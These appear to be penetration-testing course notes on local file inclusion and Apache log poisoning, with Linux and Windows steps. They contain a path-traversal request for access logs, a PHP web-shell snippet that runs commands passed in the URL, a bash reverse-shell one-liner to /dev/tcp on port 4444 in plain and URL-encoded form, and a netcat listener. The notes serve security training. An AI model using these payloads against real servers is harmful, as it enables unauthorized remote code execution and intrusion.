#### LFI
Log injection includes forging and poisoning. 
Poisoning can be injection of XSS or PHP parsers.

Linux LFI:
Log Poisoning:

Find a log:
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

Send PHP snippet:


The PHP code snippet was written to the log file at apache2/access.log

Send a GET request with the cmd “ps” to test if log poisoning is
working.



It is! So now we can attempt to obtain a reverse shell with this common  TCP reverse shell one liner.

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

Here is the command after encoding the special characters to be parsed in the URL:

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

And set up our listener on port 4444:

nc -nvlp 4444

Next, we would want to upgrade our shell and achieve Priv Esc.


Windows LFI:

After discovering a web server on .../meteor, we can atttempt
file inclusion via a PHP request:
index.php?page=../../../../../xampp/apache/logs/access.log

The contents of the log are included and displayed on the web page:




The same PHP snippet works on WIndows and Linux.
<?php echo system($_GET['cmd']); ?>

Append &cmd=dir on the next GET request to check if LFI is working.

Use command ‘type' to get contents of a file.

